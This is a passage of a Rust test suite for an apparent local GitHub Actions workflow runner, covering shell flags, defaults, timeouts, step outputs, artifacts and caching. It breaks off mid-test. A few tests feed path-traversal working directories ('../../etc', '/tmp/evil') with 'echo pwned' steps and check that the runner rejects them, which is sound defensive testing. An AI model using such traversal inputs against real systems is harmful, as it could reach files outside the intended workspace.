        assert_eq!(tag1, tag2);
        assert!(tag1.starts_with(COMBINED_IMAGE_PREFIX));
    }

    #[test]
    fn combined_image_tag_changes_when_dockerfile_changes() {
        let runtimes = vec![SetupRuntime {
            language: "node".to_string(),
            version: "20".to_string(),
            install_script: "install node v1".to_string(),
        }];
        let tag1 = combined_image_tag(&runtimes, "FROM base\nRUN v1\n");
        let tag2 = combined_image_tag(&runtimes, "FROM base\nRUN v2\n");
        assert_ne!(tag1, tag2);
    }

    #[test]
    fn combined_image_tag_sorts_languages() {
        let runtimes_ab = vec![
            SetupRuntime {
                language: "a".to_string(),
                version: "1".to_string(),
                install_script: String::new(),
            },
            SetupRuntime {
                language: "b".to_string(),
                version: "2".to_string(),
                install_script: String::new(),
            },
        ];
        let runtimes_ba = vec![
            SetupRuntime {
                language: "b".to_string(),
                version: "2".to_string(),
                install_script: String::new(),
            },
            SetupRuntime {
                language: "a".to_string(),
                version: "1".to_string(),
                install_script: String::new(),
            },
        ];
        let df = "same";
        let tag_ab = combined_image_tag(&runtimes_ab, df);
        let tag_ba = combined_image_tag(&runtimes_ba, df);
        // Both should produce the same sorted prefix (a1-b2)
        assert_eq!(tag_ab, tag_ba);
    }

    // --- Shell invocation tests ---

    fn make_run_step(run: &str) -> Step {
        Step {
            name: Some("run-step".to_string()),
            uses: None,
            run: Some(run.to_string()),
            with: None,
            env: HashMap::new(),
            continue_on_error: None,
            if_condition: None,
            id: None,
            working_directory: None,
            shell: None,
            timeout_minutes: None,
        }
    }

    #[tokio::test]
    async fn bash_shell_uses_errexit_and_pipefail() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("echo hello");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
        let cmd = &calls[0].cmd;
        // Should be: bash --noprofile --norc -e -o pipefail -c <script>
        assert_eq!(cmd[0], "bash");
        assert_eq!(cmd[1], "--noprofile");
        assert_eq!(cmd[2], "--norc");
        assert_eq!(cmd[3], "-e");
        assert_eq!(cmd[4], "-o");
        assert_eq!(cmd[5], "pipefail");
        assert_eq!(cmd[6], "-c");
        assert_eq!(cmd[7], "echo hello");
    }

    #[tokio::test]
    async fn sh_shell_uses_errexit() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo hello");
        step.shell = Some("sh".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        assert_eq!(cmd[0], "sh");
        assert_eq!(cmd[1], "-e");
        assert_eq!(cmd[2], "-c");
        assert_eq!(cmd[3], "echo hello");
    }

    // --- Working-directory path traversal tests ---

    #[tokio::test]
    async fn working_directory_rejects_parent_traversal() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo pwned");
        step.working_directory = Some("../../etc".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("Invalid working-directory"));
    }

    #[tokio::test]
    async fn working_directory_allows_subdirectory() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo ok");
        step.working_directory = Some("src/app".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        // No container calls should have failed
        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
    }

    #[tokio::test]
    async fn working_directory_rejects_absolute_path() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo pwned");
        step.working_directory = Some("/tmp/evil".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("Invalid working-directory"));
    }

    // --- Defaults cascade tests ---

    #[tokio::test]
    async fn defaults_cascade_job_overrides_workflow() {
        let runtime = MockContainerRuntime::default();
        let workflow_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("sh".to_string()),
                working_directory: None,
            }),
        };
        let job_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("python".to_string()),
                working_directory: None,
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("print('hello')");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: Some(&workflow_defaults),
            job_defaults: Some(&job_defaults),
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        // Job defaults (python) should override workflow defaults (sh)
        assert_eq!(cmd[0], "python");
        assert_eq!(cmd[1], "-c");
    }

    #[tokio::test]
    async fn defaults_cascade_step_overrides_job() {
        let runtime = MockContainerRuntime::default();
        let job_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("python".to_string()),
                working_directory: None,
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo hello");
        step.shell = Some("sh".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: Some(&job_defaults),
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        // Step shell (sh) should override job defaults (python)
        assert_eq!(cmd[0], "sh");
        assert_eq!(cmd[1], "-e");
        assert_eq!(cmd[2], "-c");
    }

    #[tokio::test]
    async fn defaults_cascade_workflow_used_when_no_job_or_step() {
        let runtime = MockContainerRuntime::default();
        let workflow_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("sh".to_string()),
                working_directory: None,
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("echo hello");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: Some(&workflow_defaults),
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        // Workflow defaults (sh) should be used
        assert_eq!(cmd[0], "sh");
    }

    #[tokio::test]
    async fn defaults_cascade_working_directory_from_job() {
        let runtime = MockContainerRuntime::default();
        let job_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: None,
                working_directory: Some("src".to_string()),
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("echo ok");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: Some(&job_defaults),
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: test_services(),
            pending_cache_saves: &TEST_PENDING_CACHE_SAVES,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        // Should succeed — "src" is a valid subdirectory path
    }

    // --- sanitize_timeout_minutes tests ---

    #[test]
    fn sanitize_timeout_none_returns_default() {
        assert_eq!(sanitize_timeout_minutes(None, 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_positive_value_returned() {
        assert_eq!(sanitize_timeout_minutes(Some(30.0), 360.0), 30.0);
    }

    #[test]
    fn sanitize_timeout_nan_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(f64::NAN), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_infinity_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(f64::INFINITY), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_neg_infinity_returns_default() {
        assert_eq!(
            sanitize_timeout_minutes(Some(f64::NEG_INFINITY), 360.0),
            360.0
        );
    }

    #[test]
    fn sanitize_timeout_zero_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(0.0), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_negative_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(-5.0), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_clamps_to_max() {
        // 360 * 24 = 8640
        assert_eq!(sanitize_timeout_minutes(Some(99999.0), 360.0), 8640.0);
    }

    // --- Job-level timeout test ---

    #[tokio::test]
    async fn job_timeout_produces_failure_result() {
        // Use a very short timeout wrapping a step that sleeps longer
        let timeout_mins = 0.0001; // ~6ms
        let dur = std::time::Duration::from_secs_f64(
            sanitize_timeout_minutes(Some(timeout_mins), 360.0) * 60.0,
        );

        let step_loop = async {
            // Simulate a step that takes longer than the timeout
            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
            Ok::<(), ExecutionError>(())
        };

        let result = tokio::time::timeout(dur, step_loop).await;
        assert!(result.is_err(), "Expected timeout but step completed");
    }

    // ---- Tests for review findings ----

    #[test]
    fn record_step_status_tracks_outcome_and_conclusion() {
        let mut map = HashMap::new();
        let mut status = "success".to_string();

        let result = StepResult {
            name: "build".to_string(),
            status: StepStatus::Failure,
            output: String::new(),
            outcome: StepStatus::Failure,
            conclusion: StepStatus::Success, // continue-on-error
        };
        record_step_status(Some("build"), &result, &mut map, &mut status);

        let (outcome, conclusion) = map.get("build").unwrap();
        assert_eq!(outcome, "failure");
        assert_eq!(conclusion, "success");
        // conclusion is Success (continue-on-error), so job status stays "success"
        assert_eq!(status, "success");
    }

    #[test]
    fn record_step_status_sets_job_failure_on_failed_conclusion() {
        let mut map = HashMap::new();
        let mut status = "success".to_string();

        let result = StepResult::new("test".to_string(), StepStatus::Failure, String::new());
        record_step_status(Some("test"), &result, &mut map, &mut status);

        assert_eq!(status, "failure");
    }

    #[test]
    fn record_step_status_ignores_steps_without_id() {
        let mut map = HashMap::new();
        let mut status = "success".to_string();

        let result = StepResult::new("anon".to_string(), StepStatus::Success, String::new());
        record_step_status(None, &result, &mut map, &mut status);

        assert!(map.is_empty());
    }

    #[test]
    fn process_workflow_commands_sets_output() {
        let mut outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let masker = SecretMasker::new();

        process_workflow_commands(
            "::set-output name=version::1.2.3\nsome normal output\n",
            Some("build"),
            &mut outputs,
            Some(&masker),
        );

        assert_eq!(
            outputs.get("build").unwrap().get("version").unwrap(),
            "1.2.3"
        );
    }

    #[test]
    fn process_workflow_commands_wires_add_mask() {
        let mut outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        let masker = SecretMasker::new();

        process_workflow_commands(
            "::add-mask::my-secret-value\n",
            None,
            &mut outputs,
            Some(&masker),
        );

        assert!(masker.has_secret("my-secret-value"));
        let masked = masker.mask("my-secret-value is here");
        assert!(!masked.contains("my-secret-value"));
    }

    #[test]
    fn process_workflow_commands_without_masker_does_not_panic() {
        let mut outputs: HashMap<String, HashMap<String, String>> = HashMap::new();
        // Passing None for secret_masker should not panic
        process_workflow_commands("::add-mask::secret\n", None, &mut outputs, None);
    }

    #[test]
    fn build_needs_context_filters_to_declared_deps() {
        let mut job = empty_workflow()
            .jobs
            .into_values()
            .next()
            .unwrap_or_else(|| serde_yaml::from_str::<Job>("steps: []").unwrap());
        job.needs = Some(vec!["build".to_string()]);

        let mut all_outputs = HashMap::new();
        let mut build_out = HashMap::new();
        build_out.insert("artifact".to_string(), "foo.tar.gz".to_string());
        all_outputs.insert("build".to_string(), build_out);
        // "deploy" outputs should NOT be included
        let mut deploy_out = HashMap::new();
        deploy_out.insert("url".to_string(), "https://example.com".to_string());
        all_outputs.insert("deploy".to_string(), deploy_out);

        let mut all_results = HashMap::new();
        all_results.insert("build".to_string(), "success".to_string());
        all_results.insert("deploy".to_string(), "failure".to_string());

        let (needs_out, needs_res) = build_needs_context(&job, &all_outputs, &all_results);

        assert!(needs_out.contains_key("build"));
        assert!(!needs_out.contains_key("deploy"));
        assert_eq!(needs_res.get("build").unwrap(), "success");
        assert!(!needs_res.contains_key("deploy"));
    }

    #[test]
    fn resolve_job_outputs_evaluates_step_reference() {
        let job: Job = serde_yaml::from_str(
            r#"
            steps: []
            outputs:
              version: "${{ steps.build.outputs.ver }}"
            "#,
        )
        .unwrap();

        let mut step_outputs = HashMap::new();
        let mut build_out = HashMap::new();
        build_out.insert("ver".to_string(), "2.0.0".to_string());
        step_outputs.insert("build".to_string(), build_out);

        let result = resolve_job_outputs(
            &job,
            &step_outputs,
            &HashMap::new(),
            &HashMap::new(),
            "success",
            Path::new("."),
        );

        assert_eq!(result.get("version").unwrap(), "2.0.0");
    }

    #[test]
    fn resolve_job_outputs_returns_empty_for_missing_step() {
        let job: Job = serde_yaml::from_str(
            r#"
            steps: []
            outputs:
              missing: "${{ steps.nonexistent.outputs.key }}"
            "#,
        )
        .unwrap();

        let result = resolve_job_outputs(
            &job,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            "success",
            Path::new("."),
        );

        assert_eq!(result.get("missing").unwrap(), "");
    }

    #[test]
    fn aggregate_reusable_workflow_outputs_merges_all_jobs() {
        let mut job_outputs = HashMap::new();
        let mut build_out = HashMap::new();
        build_out.insert("artifact".to_string(), "build.tar".to_string());
        job_outputs.insert("build".to_string(), build_out);

        let mut test_out = HashMap::new();
        test_out.insert("coverage".to_string(), "92%".to_string());
        job_outputs.insert("test".to_string(), test_out);

        let merged = aggregate_reusable_workflow_outputs(&job_outputs);
        assert_eq!(merged.get("artifact").unwrap(), "build.tar");
        assert_eq!(merged.get("coverage").unwrap(), "92%");
    }

    #[test]
    fn aggregate_reusable_workflow_outputs_skips_empty_values() {
        let mut job_outputs = HashMap::new();
        let mut out = HashMap::new();
        out.insert("key".to_string(), String::new());
        out.insert("real".to_string(), "value".to_string());
        job_outputs.insert("job".to_string(), out);

        let merged = aggregate_reusable_workflow_outputs(&job_outputs);
        assert!(!merged.contains_key("key"));
        assert_eq!(merged.get("real").unwrap(), "value");
    }

    #[test]
    fn build_needs_context_empty_when_no_needs_declared() {
        let job = make_job(None, None);

        let mut all_outputs = HashMap::new();
        all_outputs.insert("build".to_string(), HashMap::new());
        let mut all_results = HashMap::new();
        all_results.insert("build".to_string(), "success".to_string());

        let (needs_outputs, needs_results) = build_needs_context(&job, &all_outputs, &all_results);

        assert!(needs_outputs.is_empty());
        assert!(needs_results.is_empty());
    }

    #[test]
    fn build_needs_context_ignores_missing_upstream_jobs() {
        let mut job = make_job(None, None);
        job.needs = Some(vec!["nonexistent".to_string()]);

        let (needs_outputs, needs_results) =
            build_needs_context(&job, &HashMap::new(), &HashMap::new());

        assert!(needs_outputs.is_empty());
        assert!(needs_results.is_empty());
    }

    #[test]
    fn resolve_job_outputs_handles_static_and_dynamic_values() {
        let job: Job = serde_yaml::from_str(
            r#"
            steps: []
            outputs:
              version: "${{ steps.build.outputs.ver }}"
              label: "release"
            "#,
        )
        .unwrap();

        let mut step_outputs = HashMap::new();
        let mut build_out = HashMap::new();
        build_out.insert("ver".to_string(), "3.0.0".to_string());
        step_outputs.insert("build".to_string(), build_out);

        let result = resolve_job_outputs(
            &job,
            &step_outputs,
            &HashMap::new(),
            &HashMap::new(),
            "success",
            Path::new("."),
        );

        assert_eq!(result.get("version").unwrap(), "3.0.0");
        assert_eq!(result.get("label").unwrap(), "release");
    }

    #[test]
    fn resolve_job_outputs_empty_when_no_outputs_section() {
        let job = make_job(None, None);

        let resolved = resolve_job_outputs(
            &job,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            "success",
            Path::new("."),
        );

        assert!(resolved.is_empty());
    }

    #[test]
    fn resolve_job_outputs_missing_step_reference_resolves_empty() {
        // Referencing a step that doesn't exist should resolve to empty string
        let job: Job = serde_yaml::from_str(
            r#"
            steps: []
            outputs:
              ver: "${{ steps.nonexistent.outputs.version }}"
            "#,
        )
        .unwrap();

        let resolved = resolve_job_outputs(
            &job,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            "success",
            Path::new("."),
        );

        // The expression resolves to empty because the step doesn't exist
        assert_eq!(resolved.get("ver").map(|s| s.as_str()), Some(""));
    }

    // ---- Integration tests for artifact, cache, and needs.* wiring ----

    #[tokio::test]
    async fn upload_artifact_step_wiring() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        // Create a file in the workspace to upload
        std::fs::write(working_dir.path().join("build.tar"), "artifact-content").unwrap();

        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut with = HashMap::new();
        with.insert("name".to_string(), "my-build".to_string());
        with.insert("path".to_string(), "build.tar".to_string());
        let step = make_step(
            "upload",
            "actions/upload-artifact@v4",
            Some(with),
            HashMap::new(),
        );
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        assert!(result.output.contains("Uploaded artifact 'my-build'"));

        // Now download via a second step
        let download_dir = tempfile::tempdir().unwrap();
        let mut dl_with = HashMap::new();
        dl_with.insert("name".to_string(), "my-build".to_string());
        dl_with.insert("path".to_string(), "dl".to_string());
        let dl_step = make_step(
            "download",
            "actions/download-artifact@v4",
            Some(dl_with),
            HashMap::new(),
        );

        // Create the download target inside the workspace
        let dl_workspace = tempfile::tempdir().unwrap();
        let dl_ctx = StepExecutionContext {
            step: &dl_step,
            step_idx: 1,
            job_env: &job_env,
            working_dir: dl_workspace.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let dl_result = execute_step(dl_ctx).await.unwrap();
        assert_eq!(dl_result.status, StepStatus::Success);
        assert!(dl_result.output.contains("Downloaded artifact 'my-build'"));
    }

    /// Regression test for #88.
    ///
    /// A `run:` step that writes a file must land in the same workspace that
    /// `actions/upload-artifact` subsequently reads from. Under the buggy
    /// emulation runtime, run steps were rerouted to `GITHUB_WORKSPACE` (i.e.
    /// the real project directory) while artifact handlers kept using the
    /// per-job tempdir — so uploads could never find files the run step had
    /// just written.
    ///
    /// This test drives a real `EmulationRuntime` end-to-end through
    /// run → upload-artifact → download-artifact and asserts the payload
    /// round-trips byte-for-byte.
    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn run_step_upload_download_artifact_roundtrip_emulation() {
        let runtime = emulation::EmulationRuntime::new();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        // Point GITHUB_WORKSPACE at an isolated tempdir. On buggy main this is
        // where the rerouted run step writes, so upload (which reads
        // `ctx.working_dir`) finds nothing and the test fails. After the fix,
        // emulation honors the volume mount and the run step writes directly
        // into `ctx.working_dir`, so this path is irrelevant — but we still
        // isolate it to keep the test from touching the real project tree.
        let fake_github_ws = tempfile::tempdir().unwrap();

        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut job_env = HashMap::new();
        job_env.insert(
            "GITHUB_WORKSPACE".to_string(),
            fake_github_ws.path().to_string_lossy().to_string(),
        );

        // --- Step 1: run step that writes a file into the workspace ---
        let run_step = make_step_run("mkdir artifact-dir && echo hello > artifact-dir/payload.txt");
        let run_ctx = StepExecutionContext {
            step: &run_step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };
        let run_result = execute_step(run_ctx).await.unwrap();
        assert_eq!(
            run_result.status,
            StepStatus::Success,
            "run step failed: {}",
            run_result.output
        );

        // --- Step 2: upload-artifact reads the file the run step just wrote ---
        let mut up_with = HashMap::new();
        up_with.insert("name".to_string(), "payload".to_string());
        up_with.insert("path".to_string(), "artifact-dir/payload.txt".to_string());
        let up_step = make_step(
            "upload",
            "actions/upload-artifact@v4",
            Some(up_with),
            HashMap::new(),
        );
        let up_ctx = StepExecutionContext {
            step: &up_step,
            step_idx: 1,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };
        let up_result = execute_step(up_ctx).await.unwrap();
        assert_eq!(
            up_result.status,
            StepStatus::Success,
            "upload step failed (this is the #88 regression): {}",
            up_result.output
        );
        assert!(
            up_result.output.contains("Uploaded artifact 'payload'"),
            "unexpected upload output: {}",
            up_result.output
        );

        // --- Step 3: download-artifact into a fresh dir and verify byte equality ---
        let dl_workspace = tempfile::tempdir().unwrap();
        let mut dl_with = HashMap::new();
        dl_with.insert("name".to_string(), "payload".to_string());
        dl_with.insert("path".to_string(), "dl".to_string());
        let dl_step = make_step(
            "download",
            "actions/download-artifact@v4",
            Some(dl_with),
            HashMap::new(),
        );
        let dl_ctx = StepExecutionContext {
            step: &dl_step,
            step_idx: 2,
            job_env: &job_env,
            working_dir: dl_workspace.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };
        let dl_result = execute_step(dl_ctx).await.unwrap();
        assert_eq!(
            dl_result.status,
            StepStatus::Success,
            "download step failed: {}",
            dl_result.output
        );

        let downloaded = std::fs::read_to_string(
            dl_workspace
                .path()
                .join("dl")
                .join("artifact-dir/payload.txt"),
        )
        .expect("downloaded payload.txt should exist");
        assert_eq!(downloaded, "hello\n");
    }

    #[tokio::test]
    async fn cache_step_miss_defers_save_and_flush_works() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let working_dir = tempfile::tempdir().unwrap();

        // Create a directory to cache
        std::fs::create_dir_all(working_dir.path().join("node_modules")).unwrap();
        std::fs::write(working_dir.path().join("node_modules/pkg.json"), "{}").unwrap();

        let cache_dir = tempfile::tempdir().unwrap();
        let cache_store =
            crate::cache::CacheStore::with_root(cache_dir.path().to_path_buf()).unwrap();
        let artifact_dir = tempfile::tempdir().unwrap();
        let artifact_store = crate::artifacts::ArtifactStore::new(artifact_dir.path()).unwrap();
        let pending = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

        let mut with = HashMap::new();
        with.insert("key".to_string(), "deps-abc123".to_string());
        with.insert("path".to_string(), "node_modules".to_string());
        let step = make_step("cache", "actions/cache@v4", Some(with), HashMap::new());
        let job_env = HashMap::new();

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: working_dir.path(),
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
            step_outputs: &HashMap::new(),
            step_statuses: &HashMap::new(),
            job_status: "success",
            services: JobServices {
                secret_manager: None,
                secret_masker: None,
                secrets_context: &HashMap::new(),
                needs_context: &HashMap::new(),
                needs_results: &HashMap::new(),
                artifact_store: &artifact_store,
                cache_store: &cache_store,
            },
            pending_cache_saves: &pending,
        };

        let result = execute_step(ctx).await.unwrap();
